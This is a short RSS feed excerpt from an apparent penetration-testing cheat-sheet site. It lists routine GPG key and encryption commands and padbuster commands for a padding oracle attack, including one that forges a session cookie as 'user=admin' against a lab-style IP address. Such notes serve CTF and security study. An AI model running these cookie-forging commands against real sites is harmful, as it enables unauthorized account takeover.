channel.title: Encryption on TLDRBins
channel.description: Recent content in Encryption on TLDRBins

item.title: GPG
item.description: GPG # Check version gpg --version # Generate new key gpg --gen-key # Export public key gpg --export -a user@example.com # Check keys gpg --list-keys # Import public key gpg --import key.pub # Encrypt a message with public key (email from pub key) gpg --encrypt --armor -r user@example.com plaintext.txt # Decrypt a message with our private key gpg -d ciphertext.txt # Sign our own message gpg --clearsign --output - plaintext.

item.title: Padding Oracle
item.description: padbuster Download padbuster # 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://10.10.11.10/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0 -plaintext user=admin
